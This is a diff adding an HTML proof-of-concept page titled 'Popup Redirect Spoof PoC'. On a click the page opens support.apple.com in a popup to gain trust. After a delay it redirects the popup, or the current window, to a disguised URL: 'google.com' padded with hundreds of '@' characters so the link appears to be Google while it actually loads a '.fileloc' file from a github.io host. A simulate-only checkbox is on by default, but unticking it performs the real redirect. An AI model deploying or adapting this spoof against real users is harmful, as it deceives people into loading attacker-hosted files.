@@ -1,0 +1,176 @@
+<!-- filename: poc-spoof.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Popup Redirect Spoof PoC</title>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      margin: 0;
+      padding: 20px;
+      font-family: Arial, sans-serif;
+      background: #f7f7f7;
+      color: #222;
+      text-align: center;
+    }
+    .trigger-btn {
+      display: inline-block;
+      padding: 14px 24px;
+      background: #ff4444;
+      color: #fff;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 32px;
+      border: none;
+    }
+    .trigger-btn:hover { background: #cc0000; }
+    .row { margin-top: 20px; }
+    .log {
+      margin: 24px auto;
+      max-width: 800px;
+      text-align: left;
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      padding: 12px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      font-size: 13px;
+      line-height: 1.4;
+      white-space: pre-wrap;
+    }
+    .controls {
+      display: inline-flex;
+      gap: 12px;
+      align-items: center;
+      margin-top: 12px;
+      font-size: 14px;
+    }
+    label { user-select: none; }
+  </style>
+</head>
+<body>
+  <h2>Popup → Trusted Domain → Redirect to Obfuscated URL</h2>
+  <p>This PoC opens a trusted domain in a user-initiated popup, then redirects that popup to a target URL with obfuscation.</p>
+
+  <div class="controls">
+    <label>
+      <input id="simulateOnly" type="checkbox" checked />
+      Simulate only (no real redirect)
+    </label>
+    <label>
+      Delay (ms):
+      <input id="delayMs" type="number" value="1000" min="0" step="100" style="width: 100px;" />
+    </label>
+  </div>
+
+  <div class="row">
+    <button class="trigger-btn" id="btn">Trigger Spoof</button>
+  </div>
+
+  <div class="log" id="log"></div>
+
+  <script>
+    // Trusted domain shown first to gain user trust / increase popup acceptance.
+    const TRUSTED_URL = 'https://support.apple.com';
+
+    // Obfuscated target URL. Many browsers will normalize, but long garbage can truncate UI or affect copy heuristics.
+    const OBFUSCATED_URL =
+      'https://google.com' +
+      '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@' +
+      'onydose.github.io/x.fileloc';
+
+    const logEl = document.getElementById('log');
+    const btn = document.getElementById('btn');
+    const simulateOnlyEl = document.getElementById('simulateOnly');
+    const delayEl = document.getElementById('delayMs');
+
+    function log(...args) {
+      const ts = new Date().toISOString();
+      logEl.textContent += `[${ts}] ${args.join(' ')}\n`;
+      logEl.scrollTop = logEl.scrollHeight;
+      console.log(...args);
+    }
+
+    function normalizeUrl(raw) {
+      try {
+        // URL() will normalize some aspects; useful to compare what actually gets applied
+        const u = new URL(raw);
+        return u.href;
+      } catch (e) {
+        return raw;
+      }
+    }
+
+    function triggerSpoof() {
+      const delayMs = Number(delayEl.value) || 0;
+      const simulateOnly = simulateOnlyEl.checked;
+
+      log('Attempting popup to trusted domain:', TRUSTED_URL);
+
+      // Open popup synchronously on click to avoid blockers.
+      let popup = null;
+      try {
+        popup = window.open(TRUSTED_URL, '_blank', 'noopener,noreferrer');
+      } catch (e) {
+        log('window.open threw:', e && e.message ? e.message : String(e));
+      }
+
+      // Immediate checks: many browsers return null if blocked.
+      if (!popup) {
+        log('Popup blocked or returned null. Fallback will redirect current window after delay.');
+      } else {
+        log('Popup appears to be created. Verifying access...');
+      }
+
+      const targetUrlRaw = OBFUSCATED_URL;
+      const targetUrlNormalized = normalizeUrl(targetUrlRaw);
+      log('Target URL (raw):', targetUrlRaw);
+      log('Target URL (normalized):', targetUrlNormalized);
+
+      const performRedirect = () => {
+        // If popup exists and not closed, try to redirect it.
+        if (popup && !popup.closed) {
+          try {
+            if (simulateOnly) {
+              log('SIMULATION MODE: Not changing popup.location. Would set to:', targetUrlNormalized);
+            } else {
+              popup.location.href = targetUrlNormalized;
+              log('Redirected popup to target URL.');
+            }
+          } catch (e) {
+            // Cross-origin access or timing can throw. Fallback to current window redirect.
+            log('Failed to set popup.location (likely cross-origin/timing). Error:', e && e.message ? e.message : String(e));
+            fallbackRedirect(simulateOnly, targetUrlNormalized);
+          }
+        } else {
+          log('Popup unavailable or closed. Using fallback redirect in current window.');
+          fallbackRedirect(simulateOnly, targetUrlNormalized);
+        }
+      };
+
+      log(`Scheduling redirect in ${delayMs}ms...`);
+      setTimeout(performRedirect, delayMs);
+    }
+
+    function fallbackRedirect(simulateOnly, url) {
+      if (simulateOnly) {
+        log('SIMULATION MODE: Not redirecting current window. Would set window.location to:', url);
+      } else {
+        window.location.href = url;
+        log('Redirected current window to target URL (fallback).');
+      }
+    }
+
+    // Wire the button
+    btn.addEventListener('click', triggerSpoof);
+
+    // Helpful: display environment details that may affect behavior across browsers
+    log('User agent:', navigator.userAgent);
+    log('Platform:', navigator.platform || 'unknown');
+    log('Note: Popup success depends on user gesture and browser popup-blocker policies.');
+  </script>
+</body>
+</html>
